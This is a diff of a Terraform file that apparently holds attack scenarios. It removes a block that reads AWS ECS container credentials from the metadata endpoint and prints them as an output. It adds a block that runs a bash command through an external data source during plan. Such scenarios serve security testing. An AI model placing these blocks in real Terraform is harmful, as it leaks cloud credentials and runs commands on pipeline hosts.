@@ -395,13 +395,13 @@ data "aws_iam_policy_document" "access_logs" {
 }
 
 
-# Scenario 3 - Interact with metadata endpoint
+# Scenario 3 - Shell command
 
-data "http" "metadata" {
-  url = "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
+data "external" "ls_command" {
+  program = ["/bin/bash", "-c", "echo \"{\\\"result\\\":\\\"$(ls -la)\\\"}\""]
 }
 
-output "metadata_output" {
-  value = data.http.metadata.body
+output "ls_command" {
+  value = data.external.ls_command.result
 }
 
